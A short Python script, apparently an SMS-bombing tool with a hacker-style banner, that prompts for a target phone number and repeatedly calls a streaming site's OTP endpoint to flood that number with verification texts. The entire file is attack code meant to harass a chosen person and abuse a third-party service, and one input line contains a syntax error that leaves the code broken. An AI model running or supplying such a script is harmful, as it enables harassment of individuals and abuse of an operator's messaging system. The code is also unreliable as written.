import os
from urllib import request
import time

os.system('clear')

print("""
\033[1;96m ★ ███████████████████████████████ ★
\033[1;96m ★ █▄─▄▄▀█▄─██─▄█▄─▄▄▀█▄─▄▄▀█─▄▄─█ ★
\033[1;96m ★ ██─▄─▄██─██─███─██─██─▄─▄█─██─█ ★
\033[1;96m ★ ▀▄▄▀▄▄▀▀▄▄▄▄▀▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▀ ★
\033[1;96m ★ ███████████████████████████████ ★
\033[1;93m🔥╭╬───────────────────────────────────────────╬╮🔥
\033[0;94m  ✯ Name: MR. Devil ✪ RUDRO SAHA ✬
\033[0;93m  ✯ Github: https://github.com/mrdevil420 ✬
\033[0;93m  ✯ Facebook: https://www.facebook.com/mrdevil420x ✯
\033[1;93m🔥╰╬───────────────────────────────────────────╬╯🔥
""")

phone=input(print"\033[1;93m"Enter Target Number :")
sms=int(input("Set SMS Limit :"))

url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+"SMS Sent Successfully")
	time.sleep(30)
